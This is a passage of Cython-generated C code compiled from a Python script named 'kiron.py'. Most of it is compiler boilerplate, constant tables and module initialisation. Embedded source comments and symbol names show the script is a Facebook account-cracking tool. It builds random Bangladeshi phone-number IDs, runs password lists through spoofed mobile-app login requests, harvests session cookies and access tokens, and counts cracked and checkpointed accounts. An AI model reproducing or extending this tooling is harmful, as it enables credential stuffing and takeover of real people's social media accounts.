  __pyx_tuple__149 = PyTuple_Pack(20, __pyx_n_s_motorola, __pyx_n_s_mmp, __pyx_n_s_mmm, __pyx_n_s_bbbb, __pyx_n_s_kkkkki, __pyx_n_s_mmmmm, __pyx_n_s_mmmm, __pyx_n_s_cph, __pyx_n_s_chorom, __pyx_n_s_br_virshon, __pyx_n_s_mobile, __pyx_n_s_cudiua1, __pyx_n_s_cudiua2, __pyx_n_s_cudiua3, __pyx_n_s_cudiua4, __pyx_n_s_cudiua5, __pyx_n_s_cudiua6, __pyx_n_s_cudiua7, __pyx_n_s_cudiua8, __pyx_n_s_ua); if (unlikely(!__pyx_tuple__149)) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__149);
  __Pyx_GIVEREF(__pyx_tuple__149);
  __pyx_codeobj__150 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 20, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__149, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_usergent, 335, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__150)) __PYX_ERR(0, 335, __pyx_L1_error)

  /* "kiron.py":357
 *      ua = random.choice([cudiua1,cudiua2,cudiua3,cudiua4,cudiua5,cudiua6,cudiua7,cudiua8])
 *      return ua
 * def rnd():             # <<<<<<<<<<<<<<
 *     clear()
 *     print('\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m]\x1b[38;5;46m BD RANDOM CLONE')
 */
  __pyx_tuple__151 = PyTuple_Pack(1, __pyx_n_s_crk); if (unlikely(!__pyx_tuple__151)) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__151);
  __Pyx_GIVEREF(__pyx_tuple__151);
  __pyx_codeobj__152 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__151, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_rnd, 357, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__152)) __PYX_ERR(0, 357, __pyx_L1_error)

  /* "kiron.py":372
 *         menu()
 * #[ BANGLADESH ]#
 * def BD():             # <<<<<<<<<<<<<<
 *         clear()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 01768 - 01831 - 01945 - 01634')
 */
  __pyx_tuple__153 = PyTuple_Pack(11, __pyx_n_s_code, __pyx_n_s_limit, __pyx_n_s_n, __pyx_n_s_EX, __pyx_n_s_crack_submit, __pyx_n_s_tl, __pyx_n_s_love, __pyx_n_s_uid, __pyx_n_s_passlist, __pyx_n_s_genexpr, __pyx_n_s_genexpr); if (unlikely(!__pyx_tuple__153)) __PYX_ERR(0, 372, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__153);
  __Pyx_GIVEREF(__pyx_tuple__153);
  __pyx_codeobj__154 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__153, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_BD, 372, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__154)) __PYX_ERR(0, 372, __pyx_L1_error)

  /* "kiron.py":401
 *         linex()
 * #[ RAND MTD NO.1 ]#
 * def idpaslogin(uid,passlist,tl):             # <<<<<<<<<<<<<<
 *         global loop,oks,cps
 *         sys.stdout.write(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-XD\x1b[38;5;244m] \x1b[38;5;244m[\x1b[38;5;81m{loop}\x1b[38;5;244m] \x1b[38;5;46mOK\033[1;37m|\x1b[38;5;46m{len(oks)} \x1b[38;5;81mCP\033[1;37m|\x1b[38;5;81m{len(cps)} ");sys.stdout.flush()
 */
  __pyx_tuple__155 = PyTuple_Pack(19, __pyx_n_s_uid, __pyx_n_s_passlist, __pyx_n_s_tl, __pyx_n_s_ps, __pyx_n_s_session, __pyx_n_s_free_fb, __pyx_n_s_us, __pyx_n_s_data, __pyx_n_s_head, __pyx_n_s_po, __pyx_n_s_log_cookies, __pyx_n_s_coki, __pyx_n_s_ssbb, __pyx_n_s_cookies, __pyx_n_s_uidx, __pyx_n_s_ckk, __pyx_n_s_res, __pyx_n_s_key, __pyx_n_s_value); if (unlikely(!__pyx_tuple__155)) __PYX_ERR(0, 401, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__155);
  __Pyx_GIVEREF(__pyx_tuple__155);
  __pyx_codeobj__156 = (PyObject*)__Pyx_PyCode_New(3, 0, 0, 19, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__155, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_idpaslogin, 401, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__156)) __PYX_ERR(0, 401, __pyx_L1_error)

  /* "kiron.py":467
 *             time.sleep(10)
 * #__________________| FILE METHOD M1 |__________________#
 * def api1(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global oks,loop,sim_id,device
 */
  __pyx_tuple__157 = PyTuple_Pack(45, __pyx_n_s_ids, __pyx_n_s_names, __pyx_n_s_passlist, __pyx_n_s_fn, __pyx_n_s_ln, __pyx_n_s_pw, __pyx_n_s_pas, __pyx_n_s_accessToken, __pyx_n_s_fbav, __pyx_n_s_fbbv, __pyx_n_s_android_version, __pyx_n_s_model, __pyx_n_s_build, __pyx_n_s_fblc, __pyx_n_s_fbcr, __pyx_n_s_fbmf, __pyx_n_s_fbbd, __pyx_n_s_fbdv, __pyx_n_s_fbsv, __pyx_n_s_fbca, __pyx_n_s_fbdm, __pyx_n_s_fbfw, __pyx_n_s_fbrv, __pyx_n_s_fban, __pyx_n_s_fbpn, __pyx_n_s_ua, __pyx_n_s_random_seed, __pyx_n_s_adid, __pyx_n_s_device_id, __pyx_n_s_secure, __pyx_n_s_family, __pyx_n_s_xd, __pyx_n_s_sim_serials, __pyx_n_s_li, __pyx_n_s_li2, __pyx_n_s_j1, __pyx_n_s_jazoest, __pyx_n_s_data, __pyx_n_s_headers, __pyx_n_s_url, __pyx_n_s_po, __pyx_n_s_coki, __pyx_n_s_genexpr, __pyx_n_s_genexpr, __pyx_n_s_genexpr); if (unlikely(!__pyx_tuple__157)) __PYX_ERR(0, 467, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__157);
  __Pyx_GIVEREF(__pyx_tuple__157);
  __pyx_codeobj__158 = (PyObject*)__Pyx_PyCode_New(3, 0, 0, 45, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__157, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_api1, 467, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__158)) __PYX_ERR(0, 467, __pyx_L1_error)

  /* "kiron.py":571
 *                 time.sleep(10)
 * #__________________| FILE METHOD M2 |__________________#
 * def api2(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global oks,loop,sim_id
 */
  __pyx_codeobj__159 = (PyObject*)__Pyx_PyCode_New(3, 0, 0, 45, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__157, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_api2, 571, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__159)) __PYX_ERR(0, 571, __pyx_L1_error)
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}
/* #### Code section: init_constants ### */

static CYTHON_SMALL_CODE int __Pyx_InitConstants(void) {
  if (__Pyx_CreateStringTabAndInitStrings() < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  __pyx_float_2e7 = PyFloat_FromDouble(2e7); if (unlikely(!__pyx_float_2e7)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_float_3e7 = PyFloat_FromDouble(3e7); if (unlikely(!__pyx_float_3e7)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_float_20000000_0 = PyFloat_FromDouble(20000000.0); if (unlikely(!__pyx_float_20000000_0)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_float_30000000_0 = PyFloat_FromDouble(30000000.0); if (unlikely(!__pyx_float_30000000_0)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_2 = PyInt_FromLong(2); if (unlikely(!__pyx_int_2)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_3 = PyInt_FromLong(3); if (unlikely(!__pyx_int_3)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_4 = PyInt_FromLong(4); if (unlikely(!__pyx_int_4)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_5 = PyInt_FromLong(5); if (unlikely(!__pyx_int_5)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_6 = PyInt_FromLong(6); if (unlikely(!__pyx_int_6)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_7 = PyInt_FromLong(7); if (unlikely(!__pyx_int_7)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_8 = PyInt_FromLong(8); if (unlikely(!__pyx_int_8)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_9 = PyInt_FromLong(9); if (unlikely(!__pyx_int_9)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_10 = PyInt_FromLong(10); if (unlikely(!__pyx_int_10)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_11 = PyInt_FromLong(11); if (unlikely(!__pyx_int_11)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_12 = PyInt_FromLong(12); if (unlikely(!__pyx_int_12)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_13 = PyInt_FromLong(13); if (unlikely(!__pyx_int_13)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_16 = PyInt_FromLong(16); if (unlikely(!__pyx_int_16)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_17 = PyInt_FromLong(17); if (unlikely(!__pyx_int_17)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_18 = PyInt_FromLong(18); if (unlikely(!__pyx_int_18)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_19 = PyInt_FromLong(19); if (unlikely(!__pyx_int_19)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_20 = PyInt_FromLong(20); if (unlikely(!__pyx_int_20)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_30 = PyInt_FromLong(30); if (unlikely(!__pyx_int_30)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_34 = PyInt_FromLong(34); if (unlikely(!__pyx_int_34)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_36 = PyInt_FromLong(36); if (unlikely(!__pyx_int_36)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_38 = PyInt_FromLong(38); if (unlikely(!__pyx_int_38)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_39 = PyInt_FromLong(39); if (unlikely(!__pyx_int_39)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_40 = PyInt_FromLong(40); if (unlikely(!__pyx_int_40)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_42 = PyInt_FromLong(42); if (unlikely(!__pyx_int_42)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_44 = PyInt_FromLong(44); if (unlikely(!__pyx_int_44)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_49 = PyInt_FromLong(49); if (unlikely(!__pyx_int_49)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_59 = PyInt_FromLong(59); if (unlikely(!__pyx_int_59)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_77 = PyInt_FromLong(77); if (unlikely(!__pyx_int_77)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_89 = PyInt_FromLong(89); if (unlikely(!__pyx_int_89)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_99 = PyInt_FromLong(99); if (unlikely(!__pyx_int_99)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_110 = PyInt_FromLong(110); if (unlikely(!__pyx_int_110)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_111 = PyInt_FromLong(111); if (unlikely(!__pyx_int_111)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_120 = PyInt_FromLong(120); if (unlikely(!__pyx_int_120)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_311 = PyInt_FromLong(311); if (unlikely(!__pyx_int_311)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_499 = PyInt_FromLong(499); if (unlikely(!__pyx_int_499)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_511 = PyInt_FromLong(511); if (unlikely(!__pyx_int_511)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_552 = PyInt_FromLong(552); if (unlikely(!__pyx_int_552)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_599 = PyInt_FromLong(599); if (unlikely(!__pyx_int_599)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_661 = PyInt_FromLong(661); if (unlikely(!__pyx_int_661)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_742 = PyInt_FromLong(742); if (unlikely(!__pyx_int_742)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_999 = PyInt_FromLong(999); if (unlikely(!__pyx_int_999)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_1111 = PyInt_FromLong(1111); if (unlikely(!__pyx_int_1111)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_2200 = PyInt_FromLong(2200); if (unlikely(!__pyx_int_2200)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_7120 = PyInt_FromLong(7120); if (unlikely(!__pyx_int_7120)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_7999 = PyInt_FromLong(7999); if (unlikely(!__pyx_int_7999)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_9999 = PyInt_FromLong(9999); if (unlikely(!__pyx_int_9999)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_11111 = PyInt_FromLong(11111L); if (unlikely(!__pyx_int_11111)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_20000 = PyInt_FromLong(20000L); if (unlikely(!__pyx_int_20000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_40000 = PyInt_FromLong(40000L); if (unlikely(!__pyx_int_40000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_66666 = PyInt_FromLong(66666L); if (unlikely(!__pyx_int_66666)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_99999 = PyInt_FromLong(99999L); if (unlikely(!__pyx_int_99999)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_111111 = PyInt_FromLong(111111L); if (unlikely(!__pyx_int_111111)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_199999 = PyInt_FromLong(199999L); if (unlikely(!__pyx_int_199999)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_900000 = PyInt_FromLong(900000L); if (unlikely(!__pyx_int_900000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_999999 = PyInt_FromLong(999999L); if (unlikely(!__pyx_int_999999)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_1111111 = PyInt_FromLong(1111111L); if (unlikely(!__pyx_int_1111111)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_7777777 = PyInt_FromLong(7777777L); if (unlikely(!__pyx_int_7777777)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_20000000 = PyInt_FromLong(20000000L); if (unlikely(!__pyx_int_20000000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_30000000 = PyInt_FromLong(30000000L); if (unlikely(!__pyx_int_30000000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_100000000 = PyInt_FromLong(100000000L); if (unlikely(!__pyx_int_100000000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_111111111 = PyInt_FromLong(111111111L); if (unlikely(!__pyx_int_111111111)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_999999999 = PyInt_FromLong(999999999L); if (unlikely(!__pyx_int_999999999)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_1000000000 = PyInt_FromLong(1000000000L); if (unlikely(!__pyx_int_1000000000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_9999999999 = PyInt_FromString((char *)"9999999999", 0, 0); if (unlikely(!__pyx_int_9999999999)) __PYX_ERR(0, 1, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}
/* #### Code section: init_globals ### */

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  return 0;
}
/* #### Code section: init_module ### */

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  #if CYTHON_USE_TYPE_SPECS
  __pyx_ptype_5kiron___pyx_scope_struct__genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_5kiron___pyx_scope_struct__genexpr_spec, NULL); if (unlikely(!__pyx_ptype_5kiron___pyx_scope_struct__genexpr)) __PYX_ERR(0, 382, __pyx_L1_error)
  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_5kiron___pyx_scope_struct__genexpr_spec, __pyx_ptype_5kiron___pyx_scope_struct__genexpr) < 0) __PYX_ERR(0, 382, __pyx_L1_error)
  #else
  __pyx_ptype_5kiron___pyx_scope_struct__genexpr = &__pyx_type_5kiron___pyx_scope_struct__genexpr;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  #endif
  #if !CYTHON_USE_TYPE_SPECS
  if (__Pyx_PyType_Ready(__pyx_ptype_5kiron___pyx_scope_struct__genexpr) < 0) __PYX_ERR(0, 382, __pyx_L1_error)
  #endif
  #if PY_MAJOR_VERSION < 3
  __pyx_ptype_5kiron___pyx_scope_struct__genexpr->tp_print = 0;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_ptype_5kiron___pyx_scope_struct__genexpr->tp_dictoffset && __pyx_ptype_5kiron___pyx_scope_struct__genexpr->tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_ptype_5kiron___pyx_scope_struct__genexpr->tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  #endif
  #if CYTHON_USE_TYPE_SPECS
  __pyx_ptype_5kiron___pyx_scope_struct_1_genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_5kiron___pyx_scope_struct_1_genexpr_spec, NULL); if (unlikely(!__pyx_ptype_5kiron___pyx_scope_struct_1_genexpr)) __PYX_ERR(0, 507, __pyx_L1_error)
  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_5kiron___pyx_scope_struct_1_genexpr_spec, __pyx_ptype_5kiron___pyx_scope_struct_1_genexpr) < 0) __PYX_ERR(0, 507, __pyx_L1_error)
  #else
  __pyx_ptype_5kiron___pyx_scope_struct_1_genexpr = &__pyx_type_5kiron___pyx_scope_struct_1_genexpr;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  #endif
  #if !CYTHON_USE_TYPE_SPECS
  if (__Pyx_PyType_Ready(__pyx_ptype_5kiron___pyx_scope_struct_1_genexpr) < 0) __PYX_ERR(0, 507, __pyx_L1_error)
  #endif
  #if PY_MAJOR_VERSION < 3
  __pyx_ptype_5kiron___pyx_scope_struct_1_genexpr->tp_print = 0;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_ptype_5kiron___pyx_scope_struct_1_genexpr->tp_dictoffset && __pyx_ptype_5kiron___pyx_scope_struct_1_genexpr->tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_ptype_5kiron___pyx_scope_struct_1_genexpr->tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  #endif
  #if CYTHON_USE_TYPE_SPECS
  __pyx_ptype_5kiron___pyx_scope_struct_2_genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_5kiron___pyx_scope_struct_2_genexpr_spec, NULL); if (unlikely(!__pyx_ptype_5kiron___pyx_scope_struct_2_genexpr)) __PYX_ERR(0, 551, __pyx_L1_error)
  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_5kiron___pyx_scope_struct_2_genexpr_spec, __pyx_ptype_5kiron___pyx_scope_struct_2_genexpr) < 0) __PYX_ERR(0, 551, __pyx_L1_error)
  #else
  __pyx_ptype_5kiron___pyx_scope_struct_2_genexpr = &__pyx_type_5kiron___pyx_scope_struct_2_genexpr;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  #endif
  #if !CYTHON_USE_TYPE_SPECS
  if (__Pyx_PyType_Ready(__pyx_ptype_5kiron___pyx_scope_struct_2_genexpr) < 0) __PYX_ERR(0, 551, __pyx_L1_error)
  #endif
  #if PY_MAJOR_VERSION < 3
  __pyx_ptype_5kiron___pyx_scope_struct_2_genexpr->tp_print = 0;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_ptype_5kiron___pyx_scope_struct_2_genexpr->tp_dictoffset && __pyx_ptype_5kiron___pyx_scope_struct_2_genexpr->tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_ptype_5kiron___pyx_scope_struct_2_genexpr->tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  #endif
  #if CYTHON_USE_TYPE_SPECS
  __pyx_ptype_5kiron___pyx_scope_struct_3_genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_5kiron___pyx_scope_struct_3_genexpr_spec, NULL); if (unlikely(!__pyx_ptype_5kiron___pyx_scope_struct_3_genexpr)) __PYX_ERR(0, 611, __pyx_L1_error)
  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_5kiron___pyx_scope_struct_3_genexpr_spec, __pyx_ptype_5kiron___pyx_scope_struct_3_genexpr) < 0) __PYX_ERR(0, 611, __pyx_L1_error)
  #else
  __pyx_ptype_5kiron___pyx_scope_struct_3_genexpr = &__pyx_type_5kiron___pyx_scope_struct_3_genexpr;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  #endif
  #if !CYTHON_USE_TYPE_SPECS
  if (__Pyx_PyType_Ready(__pyx_ptype_5kiron___pyx_scope_struct_3_genexpr) < 0) __PYX_ERR(0, 611, __pyx_L1_error)
  #endif
  #if PY_MAJOR_VERSION < 3
  __pyx_ptype_5kiron___pyx_scope_struct_3_genexpr->tp_print = 0;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_ptype_5kiron___pyx_scope_struct_3_genexpr->tp_dictoffset && __pyx_ptype_5kiron___pyx_scope_struct_3_genexpr->tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_ptype_5kiron___pyx_scope_struct_3_genexpr->tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  #endif
  #if CYTHON_USE_TYPE_SPECS
  __pyx_ptype_5kiron___pyx_scope_struct_4_genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_5kiron___pyx_scope_struct_4_genexpr_spec, NULL); if (unlikely(!__pyx_ptype_5kiron___pyx_scope_struct_4_genexpr)) __PYX_ERR(0, 656, __pyx_L1_error)
  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_5kiron___pyx_scope_struct_4_genexpr_spec, __pyx_ptype_5kiron___pyx_scope_struct_4_genexpr) < 0) __PYX_ERR(0, 656, __pyx_L1_error)
  #else
  __pyx_ptype_5kiron___pyx_scope_struct_4_genexpr = &__pyx_type_5kiron___pyx_scope_struct_4_genexpr;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  #endif
  #if !CYTHON_USE_TYPE_SPECS
  if (__Pyx_PyType_Ready(__pyx_ptype_5kiron___pyx_scope_struct_4_genexpr) < 0) __PYX_ERR(0, 656, __pyx_L1_error)
  #endif
  #if PY_MAJOR_VERSION < 3
  __pyx_ptype_5kiron___pyx_scope_struct_4_genexpr->tp_print = 0;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_ptype_5kiron___pyx_scope_struct_4_genexpr->tp_dictoffset && __pyx_ptype_5kiron___pyx_scope_struct_4_genexpr->tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_ptype_5kiron___pyx_scope_struct_4_genexpr->tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  #endif
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_kiron(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_kiron},
  {0, NULL}
};
#endif

#ifdef __cplusplus
namespace {
  struct PyModuleDef __pyx_moduledef =
  #else
  static struct PyModuleDef __pyx_moduledef =
  #endif
  {
      PyModuleDef_HEAD_INIT,
      "kiron",
      0, /* m_doc */
    #if CYTHON_PEP489_MULTI_PHASE_INIT
      0, /* m_size */
    #elif CYTHON_USE_MODULE_STATE
      sizeof(__pyx_mstate), /* m_size */
    #else
      -1, /* m_size */
    #endif
      __pyx_methods /* m_methods */,
    #if CYTHON_PEP489_MULTI_PHASE_INIT
      __pyx_moduledef_slots, /* m_slots */
    #else
